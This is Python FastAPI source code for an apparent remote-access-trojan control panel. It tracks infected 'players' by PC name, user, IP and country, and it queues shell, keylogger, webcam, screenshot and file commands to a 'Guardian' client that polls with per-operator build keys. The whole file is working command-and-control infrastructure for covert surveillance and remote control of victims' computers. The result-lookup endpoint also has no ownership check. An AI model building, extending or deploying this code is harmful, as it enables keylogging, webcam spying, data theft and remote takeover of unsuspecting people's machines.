from typing import Any, List, Dict
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User
from app.services.stream_manager import stream_manager
from app.api.v1.endpoints.online import online_players
from datetime import datetime
import asyncio

router = APIRouter()

# Command queue per player - {player_name: [{'id': int, 'cmd': str, 'type': str, 'user_id': int}]}
command_queue: Dict[str, List[dict]] = {}
# Command History - stores all commands with their status and results
# List of dicts: {id, player, type, data, user_id, status, result, created_at, completed_at}
command_history: List[dict] = []
command_results: Dict[int, dict] = {} # Keep for quick lookup by ID
command_counter = 0

@router.get("/players")
def get_remote_players(
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get players available for remote control"""
    result = []
    
    for player_name, data in online_players.items():
        # Admin sees all, others only their own
        if current_user.is_admin or data.get('user_id') == current_user.id:
            # Check if guardian is connected via websocket
            stats = stream_manager.get_stats(player_name)
            is_connected = stats is not None
            
            result.append({
                "player": player_name,
                "name": player_name,  # Keep for backwards compatibility
                "pc_name": data.get('pc_name', 'Unknown'),
                "pc_user": data.get('pc_user', 'Unknown'),
                "ip": data.get('ip', 'Unknown'),
                "country": data.get('country', 'Unknown'),
                "connected": is_connected,
                "source": data.get('source', 'mod'),
                "last_seen": data.get('last_seen').isoformat() if data.get('last_seen') else datetime.now().isoformat(),
                "streaming": stats.get('streaming', False) if stats else False,
                "type": stats.get('type') if stats else None
            })
    
    return {
        "success": True,
        "players": result,
        "count": len(result)
    }

@router.get("/commands")
def list_history(
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """List command history for panel users"""
    result = []
    # Filter history by user permissions
    for cmd in reversed(command_history[-50:]): # Show last 50
        if current_user.is_admin or cmd.get('user_id') == current_user.id:
            result.append(cmd)

    return {"success": True, "commands": result, "count": len(result)}

@router.get("/command/{command_id}")
def get_command_by_id(
    command_id: int,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get single command by ID for frontend polling"""
    # Find command in history
    for cmd in command_history:
        if cmd.get('id') == command_id:
            # Check permissions
            if not current_user.is_admin and cmd.get('user_id') != current_user.id:
                raise HTTPException(status_code=403, detail="Not authorized")
            
            # Check for result in command_results
            if command_id in command_results:
                cmd = {**cmd, **command_results[command_id]}
            
            return {"success": True, "command": cmd}
    
    raise HTTPException(status_code=404, detail="Command not found")

@router.post("/command")
async def send_remote_command(
    data: dict,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Send command to a player"""
    global command_counter
    
    # Support both field name formats
    player_name = data.get('player') or data.get('target_player')
    cmd_type = data.get('type') or data.get('command_type')  # shell, screenshot, keylogger, webcam, files, download, upload
    cmd_data = data.get('data') or data.get('command_data', {})
    
    if not player_name:
        raise HTTPException(status_code=400, detail="Player name required")
    
    if not cmd_type:
        raise HTTPException(status_code=400, detail="Command type required")
    
    # Check if player exists and belongs to user
    print(f"DEBUG: Command request for player '{player_name}' by user {current_user.id}. Online: {list(online_players.keys())}")
    
    if player_name not in online_players:
        raise HTTPException(status_code=404, detail=f"Player '{player_name}' not online/registered")
    
    player_data = online_players[player_name]
    if not current_user.is_admin and player_data.get('user_id') != current_user.id:
        raise HTTPException(status_code=403, detail="Not authorized to control this player")
    
    # Create command
    command_counter += 1
    cmd_id = command_counter
    
    command = {
        'id': cmd_id,
        'player': player_name,
        'type': cmd_type,
        'data': cmd_data,
        'user_id': current_user.id,
        'status': 'pending',
        'result': None,
        'created_at': datetime.now().isoformat()
    }
    
    if player_name not in command_queue:
        command_queue[player_name] = []
    command_queue[player_name].append(command)
    
    # Add to history
    command_history.append(command)
    # --- HYBRID PROTOCOL BRIDGE ---
    # Check if Guardian is connected via WebSocket and emit event directly
    try:
        stats = stream_manager.get_stats(player_name)
        if stats and 'sid' in stats:
            print(f"DEBUG: Instant emit command {cmd_id} ({cmd_type}) to Guardian {player_name}")
            
            from app.main import sio
            
            payload = {
                'type': cmd_type,
                'data': cmd_data,
                'from_sid': data.get('from_sid') or 'panel_api' # origin
            }
            
            # Run async emit in sync context (this func is async so await works)
            await sio.emit('execute_command', payload, room=stats['sid'])
            
            # Update status to sent immediately
            for cmd in command_history:
                if cmd['id'] == cmd_id:
                    cmd['status'] = 'sent'
                    break
            
    except Exception as e:
        print(f"DEBUG: Failed to bridge command to socket: {e}")
        # Fallback to queue (already done)

    return {
        "success": True,
        "command_id": cmd_id,
        "message": f"Command queued for {player_name}"
    }

# Simple cache for build keys to avoid DB hits on every poll
build_key_cache: Dict[str, User] = {}

@router.get("/poll/{build_key}/{player_name}")
def poll_commands(
    build_key: str,
    player_name: str,
    db: Session = Depends(get_db),
) -> Any:
    """Guardian polls for pending commands"""
    
    # Check cache first
    if build_key in build_key_cache:
        # Verify if user object is still valid attached to session? 
        # Actually we don't need the user object for anything other than validation here.
        # So just caching existence is enough.
        # But we might need user_id later.
        pass
    else:
        # Validate build key
        user = db.query(User).filter(User.build_key == build_key).first()
        if not user:
            # Don't cache invalid keys to prevent DoS with random keys filling memory?
            # Or cache them as None to deny fast?
            raise HTTPException(status_code=404, detail="Invalid build key")
        build_key_cache[build_key] = True # Mark as valid
    
    # Update last seen
    if player_name in online_players:
        online_players[player_name]['last_seen'] = datetime.now()
    
    # Get pending commands
    commands = command_queue.get(player_name, [])
    
    # If no commands, return empty immediately
    if not commands:
         return {
            "success": True,
            "commands": []
        }

    command_queue[player_name] = []  # Clear after fetching
    
    # Update status in history
    for cmd in commands:
        for hist_cmd in command_history:
            if hist_cmd['id'] == cmd['id']:
                 hist_cmd['status'] = 'sent'
                 break

    print(f"DEBUG: Sending {len(commands)} commands to {player_name}: {[c['type'] for c in commands]}")
    return {
        "success": True,
        "commands": commands
    }

@router.post("/result/{build_key}/{command_id}")
async def submit_command_result(
    build_key: str,
    command_id: int,
    data: dict,
    db: Session = Depends(get_db),
) -> Any:
    """Guardian submits command result"""
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    result_data = {
        'result': data.get('result'),
        'status': data.get('status', 'completed'),
        'completed_at': datetime.now().isoformat()
    }
    
    command_results[command_id] = result_data
    
    # Update history
    for cmd in command_history:
        if cmd['id'] == command_id:
            cmd['status'] = result_data['status']
            cmd['result'] = result_data['result']
            cmd['completed_at'] = result_data['completed_at']
            break
            
    return {"success": True}

@router.get("/result/{command_id}")
def get_command_result(
    command_id: int,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get result of a command"""
    if command_id not in command_results:
        return {"success": True, "status": "pending", "result": None}
    
    return {
        "success": True,
        **command_results[command_id]
    }
